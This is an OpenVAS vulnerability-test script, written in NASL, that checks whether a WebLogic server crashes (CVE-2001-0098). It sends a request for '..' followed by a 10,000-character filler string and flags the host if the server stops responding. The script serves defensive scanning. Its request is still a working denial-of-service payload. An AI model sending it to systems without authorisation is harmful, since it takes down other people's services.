# OpenVAS Vulnerability Test
# $Id: weblogic_dotdotdos.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: WebLogic Server DoS
#
# Authors:
# Vincent Renardias <vincent@strongholdnet.com>
#
# Copyright:
# Copyright (C) 2001 StrongHoldNet
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "Requesting an overly long URL starting with a double dot
can crash certain version of WebLogic servers.";

tag_solution = "upgrade to at least WebLogic 5.1 with Service Pack 7";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.10697");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2138);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_cve_id("CVE-2001-0098");
 name = "WebLogic Server DoS";
 
 script_name(name);
 

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 
 script_copyright("This script is Copyright (C) 2001 StrongHoldNet");
 family = "Remote file access";
 script_family(family);
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);


if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 soc = http_open_socket(port);
 if(soc)
 {
  buffer = http_get(item:string("..", crap(10000)), port:port);
  send(socket:soc, data:buffer);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port))security_message(port);
 }
}

